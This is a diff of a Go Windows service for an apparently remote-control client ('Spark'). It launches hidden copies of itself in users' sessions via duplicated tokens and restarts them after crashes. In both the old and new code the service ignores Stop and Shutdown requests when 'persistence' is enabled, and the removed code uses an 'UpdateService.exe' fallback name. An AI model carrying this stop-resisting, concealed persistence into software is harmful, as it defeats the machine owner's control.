@@ -3,14 +3,11 @@
 package lifecycle
 
 import (
-	"bytes"
+	"Spark/client/telemetry"
 	"context"
 	"errors"
 	"fmt"
 	"os"
-	"os/exec"
-	"path/filepath"
-	"strconv"
 	"sync"
 	"syscall"
 	"time"
@@ -32,6 +29,10 @@ const (
 const (
 	wtsCurrentServerHandle = 0
 	exitCodeStillActive    = 259
+
+	// Session event notifications we care about
+	notifyForThisSession = 0
+	notifyForAllSessions = 1
 )
 
 // windowsService implements service.Interface from kardianos/service
@@ -43,16 +44,44 @@ type windowsService struct {
 
 var (
 	serviceInstallPath string
-
-	sessionProcessMu sync.Mutex
-	sessionProcesses = make(map[uint32]uint32)
+	errNoInteractiveSession = errors.New("no interactive user sessions available")
 )
 
-var errNoInteractiveSession = errors.New("no interactive user sessions available")
-
+// resilientService runs the SCM control loop with event-driven session management
 type resilientService struct {
 	app Application
 }
+
+// SessionState tracks the desired and actual state of a session's UI process
+type SessionState struct {
+	sessionID      uint32
+	desired        string // "active" or "none"
+	actual         string // "running" or "stopped"
+	process        *ProcessHandle
+	lastLaunchTime time.Time
+	launchAttempts int
+	launchErrors   []error
+	mu             sync.Mutex // Per-session mutex to prevent double-launch races
+	launching      bool       // Flag to prevent concurrent launches
+}
+
+// ProcessHandle wraps Windows process and job object handles
+type ProcessHandle struct {
+	processHandle windows.Handle
+	jobHandle     windows.Handle
+	pid           uint32
+	startTime     time.Time
+}
+
+var (
+	sessionStateMu sync.RWMutex
+	sessionStates  = make(map[uint32]*SessionState)
+
+	// Launch retry configuration
+	maxLaunchAttempts = 5
+	launchBackoffBase = 2 * time.Second
+	launchBackoffMax  = 60 * time.Second
+)
 
 // Start is called when the service is started
 func (ws *windowsService) Start(s service.Service) error {
@@ -87,9 +116,587 @@ func (ws *windowsService) Stop(s service.Service) error {
 	return nil
 }
 
+// Execute provides the SCM control loop with event-driven session management
+func (rs *resilientService) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (bool, uint32) {
+	accepts := svc.AcceptSessionChange | svc.AcceptPowerEvent | svc.AcceptStop | svc.AcceptShutdown
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+
+	telemetry.LogSessionEvent("service started", 0, map[string]interface{}{
+		"install_path": serviceInstallPath,
+	})
+
+	// Start core application in Session 0 (WebSocket connection)
+	go func() {
+		for {
+			if rs.app != nil {
+				telemetry.LogSessionEvent("starting core app in session 0", 0, nil)
+				if err := rs.app.Run(ctx); err != nil && ctx.Err() == nil {
+					telemetry.LogSessionError("core app exited", 0, err, nil)
+				}
+			}
+			select {
+			case <-ctx.Done():
+				telemetry.LogSessionEvent("core app shutdown", 0, nil)
+				return
+			case <-time.After(2 * time.Second):
+			}
+		}
+	}()
+
+	// Start session reconciliation loop (replaces polling)
+	go sessionReconciliationLoop(ctx)
+
+	// Perform initial session scan
+	go reconcileAllSessions()
+
+	changes <- svc.Status{State: svc.StartPending, Accepts: accepts}
+	changes <- svc.Status{State: svc.Running, Accepts: accepts}
+	telemetry.LogSessionEvent("service running", 0, nil)
+
+	// SCM event loop
+	for c := range r {
+		switch c.Cmd {
+		case svc.Interrogate:
+			changes <- c.CurrentStatus
+
+		case svc.Stop, svc.Shutdown:
+			if !persistenceAllowed(serviceInstallPath) {
+				telemetry.LogSessionEvent("service stopping", 0, map[string]interface{}{
+					"reason": "stop request",
+				})
+				cancel()
+				terminateAllSessions()
+				changes <- svc.Status{State: svc.StopPending, Accepts: accepts}
+				return false, 0
+			}
+			telemetry.LogSessionEvent("stop request ignored", 0, map[string]interface{}{
+				"reason": "persistence enabled",
+			})
+			changes <- svc.Status{State: svc.Running, Accepts: accepts}
+
+		case svc.SessionChange:
+			handleSessionChangeEvent(c.EventType, uint32(c.EventData))
+			changes <- c.CurrentStatus
+
+		case svc.PowerEvent:
+			telemetry.LogSessionEvent("power event", 0, map[string]interface{}{
+				"event_type": c.EventType,
+			})
+			changes <- c.CurrentStatus
+
+		default:
+			changes <- c.CurrentStatus
+		}
+	}
+
+	cancel()
+	terminateAllSessions()
+	return false, 0
+}
+
+// handleSessionChangeEvent processes Windows session change notifications
+func handleSessionChangeEvent(eventType uint32, sessionID uint32) {
+	defer func() {
+		if r := recover(); r != nil {
+			telemetry.LogSessionError("handleSessionChangeEvent panic recovered", sessionID, fmt.Errorf("%v", r), map[string]interface{}{
+				"event_type": eventType,
+			})
+		}
+	}()
+
+	eventName := sessionEventName(eventType)
+
+	// Fix label cardinality: use event name only, not session_id
+	telemetry.SessionEventsTotal.WithLabelValues(eventName, "all").Inc()
+	telemetry.LogSessionEvent("session change", sessionID, map[string]interface{}{
+		"event": eventName,
+	})
+
+	switch eventType {
+	case windows.WTS_SESSION_LOGON, windows.WTS_SESSION_UNLOCK, windows.WTS_CONSOLE_CONNECT, windows.WTS_REMOTE_CONNECT:
+		// User became active - launch UI
+		setSessionDesiredState(sessionID, "active")
+		go func() {
+			defer func() {
+				if r := recover(); r != nil {
+					telemetry.LogSessionError("reconcileSession panic", sessionID, fmt.Errorf("%v", r), nil)
+				}
+			}()
+			reconcileSession(sessionID)
+		}()
+
+	case windows.WTS_SESSION_LOGOFF, windows.WTS_SESSION_TERMINATE, windows.WTS_SESSION_LOCK, windows.WTS_CONSOLE_DISCONNECT, windows.WTS_REMOTE_DISCONNECT:
+		// User became inactive - terminate UI
+		setSessionDesiredState(sessionID, "none")
+		go func() {
+			defer func() {
+				if r := recover(); r != nil {
+					telemetry.LogSessionError("reconcileSession panic", sessionID, fmt.Errorf("%v", r), nil)
+				}
+			}()
+			reconcileSession(sessionID)
+		}()
+	}
+}
+
+// sessionReconciliationLoop periodically reconciles session states
+// This provides a safety net in case events are missed
+// Runs every 10 seconds (reduced from 30s for faster recovery)
+func sessionReconciliationLoop(ctx context.Context) {
+	defer func() {
+		if r := recover(); r != nil {
+			telemetry.LogSessionEvent("reconciliation loop panic recovered", 0, map[string]interface{}{
+				"panic": fmt.Sprintf("%v", r),
+			})
+			// Restart the loop
+			go sessionReconciliationLoop(ctx)
+		}
+	}()
+
+	ticker := time.NewTicker(10 * time.Second)
+	defer ticker.Stop()
+
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		case <-ticker.C:
+			reconcileAllSessions()
+		}
+	}
+}
+
+// reconcileAllSessions scans all sessions and reconciles their states
+func reconcileAllSessions() {
+	sessionStateMu.Lock()
+	defer sessionStateMu.Unlock()
+
+	// Get current active session
+	activeSessionID, err := getInteractiveSessionID()
+	if err != nil {
+		// No active sessions - mark all as desired=none
+		for sid := range sessionStates {
+			sessionStates[sid].desired = "none"
+		}
+		telemetry.LogSessionEvent("no active sessions", 0, nil)
+	} else {
+		// Mark active session as desired=active, others as desired=none
+		for sid := range sessionStates {
+			if sid == activeSessionID {
+				sessionStates[sid].desired = "active"
+			} else {
+				sessionStates[sid].desired = "none"
+			}
+		}
+
+		// Ensure active session has a state entry
+		if _, exists := sessionStates[activeSessionID]; !exists {
+			sessionStates[activeSessionID] = &SessionState{
+				sessionID: activeSessionID,
+				desired:   "active",
+				actual:    "stopped",
+			}
+		}
+	}
+
+	// Reconcile each session
+	for sid := range sessionStates {
+		go reconcileSession(sid)
+	}
+}
+
+// reconcileSession reconciles a single session's actual state to match desired state
+func reconcileSession(sessionID uint32) {
+	sessionStateMu.Lock()
+	state, exists := sessionStates[sessionID]
+	if !exists {
+		state = &SessionState{
+			sessionID: sessionID,
+			desired:   "none",
+			actual:    "stopped",
+		}
+		sessionStates[sessionID] = state
+	}
+	sessionStateMu.Unlock()
+
+	// Check if reconciliation is needed
+	sessionStateMu.RLock()
+	desired := state.desired
+	actual := state.actual
+	sessionStateMu.RUnlock()
+
+	if desired == actual {
+		// Already in sync
+		return
+	}
+
+	if desired == "active" && actual == "stopped" {
+		// Launch UI process
+		launchUIInSession(sessionID)
+	} else if desired == "none" && actual == "running" {
+		// Terminate UI process
+		terminateUIInSession(sessionID)
+	}
+}
+
+// setSessionDesiredState updates the desired state of a session
+func setSessionDesiredState(sessionID uint32, desired string) {
+	sessionStateMu.Lock()
+	defer sessionStateMu.Unlock()
+
+	if state, exists := sessionStates[sessionID]; exists {
+		state.desired = desired
+	} else {
+		sessionStates[sessionID] = &SessionState{
+			sessionID: sessionID,
+			desired:   desired,
+			actual:    "stopped",
+		}
+	}
+}
+
+// launchUIInSession launches the UI process in a user session with Job Object tracking
+func launchUIInSession(sessionID uint32) {
+	defer func() {
+		if r := recover(); r != nil {
+			telemetry.LogSessionError("launch panic recovered", sessionID, fmt.Errorf("%v", r), nil)
+		}
+	}()
+
+	sessionStateMu.Lock()
+	state := sessionStates[sessionID]
+	sessionStateMu.Unlock()
+
+	// Per-session mutex to prevent double-launch races
+	state.mu.Lock()
+	defer state.mu.Unlock()
+
+	// Check if already launching
+	if state.launching {
+		telemetry.LogSessionEvent("launch already in progress", sessionID, nil)
+		return
+	}
+
+	// Check if already running
+	if state.actual == "running" && state.process != nil && isProcessRunning(state.process) {
+		telemetry.LogSessionEvent("UI already running", sessionID, map[string]interface{}{
+			"pid": state.process.pid,
+		})
+		return
+	}
+
+	// Mark as launching
+	state.launching = true
+	defer func() { state.launching = false }()
+
+	// Check launch attempts and backoff
+	if state.launchAttempts >= maxLaunchAttempts {
+		telemetry.LogSessionError("max launch attempts reached", sessionID, nil, map[string]interface{}{
+			"attempts": state.launchAttempts,
+			"errors":   fmt.Sprintf("%v", state.launchErrors),
+		})
+		telemetry.SessionLaunchesTotal.WithLabelValues("max_attempts_exceeded").Inc()
+		return
+	}
+
+	// Apply backoff if this is a retry
+	if state.launchAttempts > 0 {
+		backoff := calculateBackoff(state.launchAttempts, launchBackoffBase, launchBackoffMax)
+		timeSinceLastLaunch := time.Since(state.lastLaunchTime)
+		if timeSinceLastLaunch < backoff {
+			waitTime := backoff - timeSinceLastLaunch
+			telemetry.LogSessionEvent("launch backoff", sessionID, map[string]interface{}{
+				"wait_seconds": waitTime.Seconds(),
+				"attempt":      state.launchAttempts,
+			})
+			time.Sleep(waitTime)
+		}
+	}
+
+	startTime := time.Now()
+	state.lastLaunchTime = startTime
+	state.launchAttempts++
+
+	telemetry.LogSessionEvent("launching UI", sessionID, map[string]interface{}{
+		"attempt":      state.launchAttempts,
+		"install_path": serviceInstallPath,
+	})
+
+	// Get user token for session with retry logic (handles race conditions)
+	token, err := queryUserTokenWithRetry(sessionID, 3, 1*time.Second)
+	if err != nil {
+		errno, ok := err.(syscall.Errno)
+		if ok && (errno == windows.ERROR_NO_TOKEN || errno == 1312) {
+			telemetry.LogSessionError("no user token after retries", sessionID, err, map[string]interface{}{
+				"errno": errno,
+			})
+			state.launchErrors = append(state.launchErrors, err)
+			telemetry.SessionLaunchesTotal.WithLabelValues("no_token").Inc()
+			return
+		}
+		telemetry.LogSessionError("token query failed after retries", sessionID, err, nil)
+		state.launchErrors = append(state.launchErrors, err)
+		telemetry.SessionLaunchesTotal.WithLabelValues("token_error").Inc()
+		return
+	}
+	defer token.Close()
+
+	// Duplicate token
+	var primaryToken windows.Token
+	if err := windows.DuplicateTokenEx(
+		token,
+		windows.MAXIMUM_ALLOWED,
+		nil,
+		windows.SecurityImpersonation,
+		windows.TokenPrimary,
+		&primaryToken,
+	); err != nil {
+		telemetry.LogSessionError("token duplicate failed", sessionID, err, nil)
+		state.launchErrors = append(state.launchErrors, err)
+		telemetry.SessionLaunchesTotal.WithLabelValues("duplicate_error").Inc()
+		return
+	}
+	defer primaryToken.Close()
+
+	// Create Job Object for clean process management
+	jobHandle, err := windows.CreateJobObject(nil, nil)
+	if err != nil {
+		telemetry.LogSessionError("job object creation failed", sessionID, err, nil)
+		state.launchErrors = append(state.launchErrors, err)
+		telemetry.SessionLaunchesTotal.WithLabelValues("job_error").Inc()
+		return
+	}
+
+	// Configure job: terminate all processes when job closes
+	var info windows.JOBOBJECT_EXTENDED_LIMIT_INFORMATION
+	info.BasicLimitInformation.LimitFlags = windows.JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE
+
+	infoSize := uint32(unsafe.Sizeof(info))
+	_, err = windows.SetInformationJobObject(
+		jobHandle,
+		windows.JobObjectExtendedLimitInformation,
+		uintptr(unsafe.Pointer(&info)),
+		infoSize,
+	)
+	if err != nil {
+		windows.CloseHandle(jobHandle)
+		telemetry.LogSessionError("job configuration failed", sessionID, err, nil)
+		state.launchErrors = append(state.launchErrors, err)
+		telemetry.SessionLaunchesTotal.WithLabelValues("job_config_error").Inc()
+		return
+	}
+
+	// Build command line
+	exePath := serviceInstallPath
+	if exePath == "" {
+		exePath, _ = os.Executable()
+	}
+	exePathUTF16, _ := syscall.UTF16PtrFromString(exePath)
+	cmdLineStr := "\"" + exePath + "\" --ui-only"
+	cmdLine, _ := syscall.UTF16PtrFromString(cmdLineStr)
+
+	// Launch process
+	var si windows.StartupInfo
+	var pi windows.ProcessInformation
+	si.Cb = uint32(unsafe.Sizeof(si))
+	si.Desktop, _ = syscall.UTF16PtrFromString("winsta0\\default")
+	si.ShowWindow = windows.SW_HIDE
+
+	if err := windows.CreateProcessAsUser(
+		primaryToken,
+		exePathUTF16,
+		cmdLine,
+		nil,
+		nil,
+		false,
+		windows.CREATE_NEW_CONSOLE|windows.NORMAL_PRIORITY_CLASS|windows.CREATE_SUSPENDED, // CREATE_SUSPENDED to assign to job first
+		nil,
+		nil,
+		&si,
+		&pi,
+	); err != nil {
+		windows.CloseHandle(jobHandle)
+		telemetry.LogSessionError("process creation failed", sessionID, err, nil)
+		state.launchErrors = append(state.launchErrors, err)
+		telemetry.SessionLaunchesTotal.WithLabelValues("create_process_error").Inc()
+		return
+	}
+
+	// Assign process to job object
+	if err := windows.AssignProcessToJobObject(jobHandle, pi.Process); err != nil {
+		windows.TerminateProcess(pi.Process, 1)
+		windows.CloseHandle(pi.Process)
+		windows.CloseHandle(pi.Thread)
+		windows.CloseHandle(jobHandle)
+		telemetry.LogSessionError("job assignment failed", sessionID, err, nil)
+		state.launchErrors = append(state.launchErrors, err)
+		telemetry.SessionLaunchesTotal.WithLabelValues("job_assign_error").Inc()
+		return
+	}
+
+	// Resume process
+	windows.ResumeThread(pi.Thread)
+	windows.CloseHandle(pi.Thread)
+
+	// Update state
+	sessionStateMu.Lock()
+	state.actual = "running"
+	state.process = &ProcessHandle{
+		processHandle: pi.Process,
+		jobHandle:     jobHandle,
+		pid:           pi.ProcessId,
+		startTime:     time.Now(),
+	}
+	state.launchErrors = nil // Clear errors on success
+	sessionStateMu.Unlock()
+
+	launchDuration := time.Since(startTime)
+	telemetry.SessionLaunchDuration.Observe(launchDuration.Seconds())
+	telemetry.SessionLaunchesTotal.WithLabelValues("success").Inc()
+	telemetry.GetHealth().SetUIProcess(true, sessionID, pi.ProcessId)
+
+	telemetry.LogSessionEvent("UI launched successfully", sessionID, map[string]interface{}{
+		"pid":              pi.ProcessId,
+		"launch_duration":  launchDuration.Seconds(),
+		"launch_attempts":  state.launchAttempts,
+	})
+
+	// Monitor process exit in background
+	go monitorProcess(sessionID, state.process)
+}
+
+// terminateUIInSession terminates the UI process in a session
+func terminateUIInSession(sessionID uint32) {
+	sessionStateMu.Lock()
+	state, exists := sessionStates[sessionID]
+	if !exists || state.actual != "running" || state.process == nil {
+		sessionStateMu.Unlock()
+		return
+	}
+	process := state.process
+	state.actual = "stopped"
+	state.process = nil
+	sessionStateMu.Unlock()
+
+	telemetry.LogSessionEvent("terminating UI", sessionID, map[string]interface{}{
+		"pid": process.pid,
+	})
+
+	// Close job handle - this terminates all processes in the job
+	windows.CloseHandle(process.jobHandle)
+	windows.CloseHandle(process.processHandle)
+
+	telemetry.GetHealth().SetUIProcess(false, sessionID, 0)
+	telemetry.LogSessionEvent("UI terminated", sessionID, map[string]interface{}{
+		"pid": process.pid,
+	})
+}
+
+// terminateAllSessions terminates UI processes in all sessions
+func terminateAllSessions() {
+	sessionStateMu.Lock()
+	sessionIDs := make([]uint32, 0, len(sessionStates))
+	for sid := range sessionStates {
+		sessionIDs = append(sessionIDs, sid)
+	}
+	sessionStateMu.Unlock()
+
+	for _, sid := range sessionIDs {
+		terminateUIInSession(sid)
+	}
+}
+
+// monitorProcess monitors a process and updates state when it exits
+func monitorProcess(sessionID uint32, process *ProcessHandle) {
+	defer func() {
+		if r := recover(); r != nil {
+			telemetry.LogSessionError("monitorProcess panic recovered", sessionID, fmt.Errorf("%v", r), nil)
+		}
+
+		// Ensure handles are closed even on panic
+		if process.jobHandle != 0 {
+			windows.CloseHandle(process.jobHandle)
+		}
+		if process.processHandle != 0 {
+			windows.CloseHandle(process.processHandle)
+		}
+	}()
+
+	// Wait for process to exit
+	windows.WaitForSingleObject(process.processHandle, windows.INFINITE)
+
+	// Get exit code
+	var exitCode uint32
+	windows.GetExitCodeProcess(process.processHandle, &exitCode)
+
+	sessionStateMu.Lock()
+	state := sessionStates[sessionID]
+	if state != nil && state.process == process {
+		state.actual = "stopped"
+		state.process = nil
+	}
+	sessionStateMu.Unlock()
+
+	telemetry.GetHealth().SetUIProcess(false, sessionID, 0)
+
+	// Close handles explicitly
+	windows.CloseHandle(process.jobHandle)
+	windows.CloseHandle(process.processHandle)
+	process.jobHandle = 0
+	process.processHandle = 0
+
+	if exitCode != 0 {
+		telemetry.UIProcessCrashesTotal.Inc()
+		telemetry.LogSessionEvent("UI process exited unexpectedly", sessionID, map[string]interface{}{
+			"pid":       process.pid,
+			"exit_code": exitCode,
+			"runtime":   time.Since(process.startTime).Seconds(),
+		})
+
+		// Retry launch if desired state is still active
+		sessionStateMu.RLock()
+		desired := state.desired
+		sessionStateMu.RUnlock()
+
+		if desired == "active" {
+			telemetry.UIProcessRestarts.Inc()
+			telemetry.LogSessionEvent("scheduling UI restart", sessionID, nil)
+			time.Sleep(5 * time.Second) // Brief delay before retry
+			go func() {
+				defer func() {
+					if r := recover(); r != nil {
+						telemetry.LogSessionError("reconcileSession restart panic", sessionID, fmt.Errorf("%v", r), nil)
+					}
+				}()
+				reconcileSession(sessionID)
+			}()
+		}
+	} else {
+		telemetry.LogSessionEvent("UI process exited normally", sessionID, map[string]interface{}{
+			"pid": process.pid,
+		})
+	}
+}
+
+// isProcessRunning checks if a process is still running
+func isProcessRunning(process *ProcessHandle) bool {
+	var exitCode uint32
+	err := windows.GetExitCodeProcess(process.processHandle, &exitCode)
+	return err == nil && exitCode == exitCodeStillActive
+}
+
+// calculateBackoff calculates exponential backoff with cap
+func calculateBackoff(attempt int, base, max time.Duration) time.Duration {
+	backoff := base * time.Duration(1<<uint(attempt-1))
+	if backoff > max {
+		backoff = max
+	}
+	return backoff
+}
+
+// getInteractiveSessionID returns the active console session ID
 func getInteractiveSessionID() (uint32, error) {
-	// Always enumerate all sessions to get accurate state information
-	// Don't trust WTSGetActiveConsoleSessionId() alone as it may return disconnected sessions
 	var sessions *windows.WTS_SESSION_INFO
 	var count uint32
 	if err := windows.WTSEnumerateSessions(windows.Handle(wtsCurrentServerHandle), 0, 1, &sessions, &count); err != nil {
@@ -103,118 +710,24 @@ func getInteractiveSessionID() (uint32, error) {
 
 	sessionSlice := unsafe.Slice((*windows.WTS_SESSION_INFO)(unsafe.Pointer(sessions)), int(count))
 
-	// First pass: look for active sessions only (skip disconnected)
+	// First pass: look for active sessions only
 	for _, s := range sessionSlice {
-		stateName := sessionStateName(s.State)
-		golog.Debugf("service: enumerated session id=%d state=%s", s.SessionID, stateName)
-
-		// Only use WTSActive sessions, skip Disconnected
 		if s.State == windows.WTSActive && s.SessionID != 0 {
-			golog.Infof("service: found active session %d", s.SessionID)
 			return s.SessionID, nil
 		}
 	}
 
-	// Second pass: look for connected but not active sessions
+	// Second pass: look for connected sessions
 	for _, s := range sessionSlice {
 		if s.State == windows.WTSConnected && s.SessionID != 0 {
-			golog.Infof("service: found connected session %d", s.SessionID)
 			return s.SessionID, nil
 		}
 	}
 
-	golog.Debug("service: no active or connected user sessions found")
 	return 0, errNoInteractiveSession
 }
 
-func sessionStateName(state uint32) string {
-	switch state {
-	case windows.WTSActive:
-		return "Active"
-	case windows.WTSConnected:
-		return "Connected"
-	case windows.WTSConnectQuery:
-		return "ConnectQuery"
-	case windows.WTSShadow:
-		return "Shadow"
-	case windows.WTSDisconnected:
-		return "Disconnected"
-	case windows.WTSIdle:
-		return "Idle"
-	case windows.WTSListen:
-		return "Listen"
-	case windows.WTSReset:
-		return "Reset"
-	case windows.WTSDown:
-		return "Down"
-	case windows.WTSInit:
-		return "Init"
-	default:
-		return fmt.Sprintf("Unknown(%d)", state)
-	}
-}
-
-func recordSessionProcess(sessionID, pid uint32) {
-	sessionProcessMu.Lock()
-	sessionProcesses[sessionID] = pid
-	sessionProcessMu.Unlock()
-}
-
-func sessionProcessRunning(sessionID uint32) bool {
-	sessionProcessMu.Lock()
-	pid, ok := sessionProcesses[sessionID]
-	sessionProcessMu.Unlock()
-	if !ok {
-		return false
-	}
-	if processAlive(pid) {
-		return true
-	}
-	clearSessionProcess(sessionID)
-	return false
-}
-
-func clearSessionProcess(sessionID uint32) {
-	sessionProcessMu.Lock()
-	delete(sessionProcesses, sessionID)
-	sessionProcessMu.Unlock()
-}
-
-func terminateSessionProcess(sessionID uint32) {
-	sessionProcessMu.Lock()
-	pid, ok := sessionProcesses[sessionID]
-	sessionProcessMu.Unlock()
-	if !ok {
-		return
-	}
-	handle, err := windows.OpenProcess(windows.PROCESS_TERMINATE, false, pid)
-	if err != nil {
-		golog.Debugf("service: terminate session %d failed to open pid %d: %v", sessionID, pid, err)
-		clearSessionProcess(sessionID)
-		return
-	}
-	defer windows.CloseHandle(handle)
-	if err := windows.TerminateProcess(handle, 0); err != nil {
-		golog.Warnf("service: terminate session %d pid %d failed: %v", sessionID, pid, err)
-	} else {
-		golog.Infof("service: terminated session process pid=%d session=%d", pid, sessionID)
-	}
-	clearSessionProcess(sessionID)
-}
-
-func processAlive(pid uint32) bool {
-	handle, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
-	if err != nil {
-		return false
-	}
-	defer windows.CloseHandle(handle)
-	var exitCode uint32
-	if err := windows.GetExitCodeProcess(handle, &exitCode); err != nil {
-		return false
-	}
-	return exitCode == exitCodeStillActive
-}
-
+// sessionEventName returns human-readable name for session event type
 func sessionEventName(eventType uint32) string {
 	switch eventType {
 	case windows.WTS_CONSOLE_CONNECT:
@@ -242,252 +755,6 @@ func sessionEventName(eventType uint32) string {
 	default:
 		return fmt.Sprintf("Event(%d)", eventType)
 	}
-}
-
-func shouldTerminateOnEvent(eventType uint32) bool {
-	switch eventType {
-	case windows.WTS_SESSION_LOGOFF, windows.WTS_SESSION_TERMINATE:
-		return true
-	default:
-		return false
-	}
-}
-
-// launchInUserSession launches the client process in the active console session (Session 1+)
-func launchInUserSession(exePath string) error {
-	if exePath == "" {
-		exePath = serviceInstallPath
-	}
-	if exePath == "" {
-		return errors.New("service: executable path unknown")
-	}
-
-	sessionID, err := getInteractiveSessionID()
-	if err != nil {
-		if errors.Is(err, errNoInteractiveSession) {
-			golog.Debug("service: no interactive user session detected - deferring launch")
-		} else {
-			golog.Warnf("service: unable to resolve interactive session: %v", err)
-		}
-		return err
-	}
-	golog.Debugf("service: resolved interactive session id=%d", sessionID)
-
-	if sessionProcessRunning(sessionID) {
-		golog.Debugf("service: tracked client already running in session %d", sessionID)
-		return nil
-	}
-
-	if isProcessRunningInSession(exePath, sessionID) {
-		golog.Debugf("service: found existing client process in session %d", sessionID)
-		return nil
-	}
-
-	golog.Infof("service: attempting to launch client in session %d", sessionID)
-
-	var token windows.Token
-	if err := windows.WTSQueryUserToken(sessionID, &token); err != nil {
-		// ERROR_NO_TOKEN (1008) or ERROR_NO_SUCH_LOGON_SESSION (1312)
-		// These indicate the session doesn't have a valid user token yet
-		// This is normal for disconnected or not-fully-logged-in sessions
-		errno, ok := err.(syscall.Errno)
-		if ok && (errno == windows.ERROR_NO_TOKEN || errno == 1312) {
-			golog.Debugf("service: session %d has no valid user token (disconnected or not logged in)", sessionID)
-			return errNoInteractiveSession
-		}
-		golog.Warnf("service: WTSQueryUserToken failed for session %d: %v (may be disconnected)", sessionID, err)
-		return errNoInteractiveSession
-	}
-	defer token.Close()
-
-	var newToken windows.Token
-	if err := windows.DuplicateTokenEx(
-		token,
-		windows.MAXIMUM_ALLOWED,
-		nil,
-		windows.SecurityImpersonation,
-		windows.TokenPrimary,
-		&newToken,
-	); err != nil {
-		golog.Errorf("service: DuplicateTokenEx failed for session %d: %v", sessionID, err)
-		return err
-	}
-	defer newToken.Close()
-
-	// Construct command line with proper Windows quoting
-	// Using lpApplicationName + lpCommandLine separately ensures args are parsed correctly
-	exePathUTF16, err := syscall.UTF16PtrFromString(exePath)
-	if err != nil {
-		golog.Errorf("service: failed to convert exe path for session %d: %v", sessionID, err)
-		return err
-	}
-
-	// lpCommandLine format: "exePath" arg1 arg2
-	// The first token is argv[0], subsequent tokens are arguments
-	cmdLineStr := "\"" + exePath + "\" --console"
-	cmdLine, err := syscall.UTF16PtrFromString(cmdLineStr)
-	if err != nil {
-		golog.Errorf("service: failed to build command line for session %d: %v", sessionID, err)
-		return err
-	}
-	golog.Debugf("service: launching command: %s", cmdLineStr)
-
-	var si windows.StartupInfo
-	var pi windows.ProcessInformation
-	si.Cb = uint32(unsafe.Sizeof(si))
-	si.Desktop, _ = syscall.UTF16PtrFromString("winsta0\\default")
-	si.ShowWindow = windows.SW_HIDE
-
-	// Use lpApplicationName=exePath and lpCommandLine with full command line
-	// This ensures Windows correctly parses argv[0] and argv[1]
-	if err := windows.CreateProcessAsUser(
-		newToken,
-		exePathUTF16,  // lpApplicationName - ensures correct exe is launched
-		cmdLine,       // lpCommandLine - full command line including argv[0] and --console
-		nil,
-		nil,
-		false,
-		windows.CREATE_NEW_CONSOLE|windows.NORMAL_PRIORITY_CLASS,
-		nil,
-		nil,
-		&si,
-		&pi,
-	); err != nil {
-		golog.Errorf("service: CreateProcessAsUser failed for session %d: %v", sessionID, err)
-		return err
-	}
-
-	recordSessionProcess(sessionID, pi.ProcessId)
-	golog.Infof("service: launched client pid=%d in session %d", pi.ProcessId, sessionID)
-
-	windows.CloseHandle(pi.Process)
-	windows.CloseHandle(pi.Thread)
-	return nil
-}
-
-func attemptUserSessionLaunch() {
-	if serviceInstallPath == "" {
-		golog.Debug("service: install path unknown, skipping session launch")
-		return
-	}
-	if err := launchInUserSession(serviceInstallPath); err != nil {
-		if errors.Is(err, errNoInteractiveSession) {
-			return
-		}
-		golog.Warnf("service: user-session launch failed: %v", err)
-	}
-}
-
-func monitorUserSessions(ctx context.Context) {
-	golog.Info("service: session monitor started")
-	attemptUserSessionLaunch()
-	ticker := time.NewTicker(10 * time.Second)
-	defer ticker.Stop()
-
-	for {
-		select {
-		case <-ctx.Done():
-			golog.Info("service: session monitor stopping")
-			return
-		case <-ticker.C:
-			attemptUserSessionLaunch()
-		}
-	}
-}
-
-// isProcessRunningInSession checks if a process is already running in the specified session
-func isProcessRunningInSession(exePath string, sessionID uint32) bool {
-	exeName := filepath.Base(exePath)
-	if exeName == "" {
-		exeName = "UpdateService.exe"
-	}
-	cmd := exec.Command("tasklist", "/FI", "IMAGENAME eq "+exeName, "/FI", "SESSION eq "+strconv.Itoa(int(sessionID)), "/NH")
-	output, err := cmd.Output()
-	if err != nil {
-		golog.Warnf("tasklist check failed for session %d: %v", sessionID, err)
-		return false
-	}
-	// If output contains the process name, it's running
-	isRunning := len(output) > 0 && !bytes.Contains(output, []byte("INFO: No tasks"))
-	if isRunning {
-		golog.Debugf("tasklist reports %s already running in session %d", exeName, sessionID)
-	}
-	return isRunning
-}
-
-// Execute provides a custom SCM loop that spawns client processes in the active user session
-func (rs *resilientService) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (bool, uint32) {
-	accepts := svc.AcceptSessionChange | svc.AcceptPowerEvent | svc.AcceptStop | svc.AcceptShutdown
-	ctx, cancel := context.WithCancel(context.Background())
-
-	golog.Info("service: Execute handler started (Session 0 watchdog)")
-	golog.Infof("service: watchdog install path: %s", serviceInstallPath)
-
-	// Start the core application in service context (Session 0)
-	// This ensures connection to server even if no user sessions are available
-	go func() {
-		for {
-			if rs.app != nil {
-				golog.Info("service: Starting core application in Session 0")
-				if err := rs.app.Run(ctx); err != nil && ctx.Err() == nil {
-					golog.Warnf("service: core app exited: %v, restarting in 2s", err)
-				}
-			}
-			select {
-			case <-ctx.Done():
-				golog.Info("service: core app shutdown requested")
-				return
-			case <-time.After(2 * time.Second):
-			}
-		}
-	}()
-
-	// Monitor user sessions and spawn UI instances when available
-	go monitorUserSessions(ctx)
-
-	changes <- svc.Status{State: svc.StartPending, Accepts: accepts}
-	golog.Info("service: Sending Running status to SCM")
-	changes <- svc.Status{State: svc.Running, Accepts: accepts}
-
-	for c := range r {
-		switch c.Cmd {
-		case svc.Interrogate:
-			golog.Debug("service: SCM interrogate request")
-			changes <- c.CurrentStatus
-
-		case svc.Stop, svc.Shutdown:
-			if !persistenceAllowed(serviceInstallPath) {
-				golog.Info("service: Stop request received and persistence disabled - stopping service")
-				cancel()
-				changes <- svc.Status{State: svc.StopPending, Accepts: accepts}
-				return false, 0
-			}
-			golog.Info("service: Stop request received but persistence enabled - ignoring stop request")
-			changes <- svc.Status{State: svc.Running, Accepts: accepts}
-
-		case svc.SessionChange:
-			sessionID := uint32(c.EventData)
-			eventName := sessionEventName(c.EventType)
-			golog.Infof("service: Session change detected event=%s sessionID=%d", eventName, sessionID)
-			if shouldTerminateOnEvent(c.EventType) {
-				terminateSessionProcess(sessionID)
-			}
-			go attemptUserSessionLaunch()
-			changes <- c.CurrentStatus
-
-		case svc.PowerEvent:
-			golog.Infof("service: Power event received type=%d", c.EventType)
-			changes <- c.CurrentStatus
-
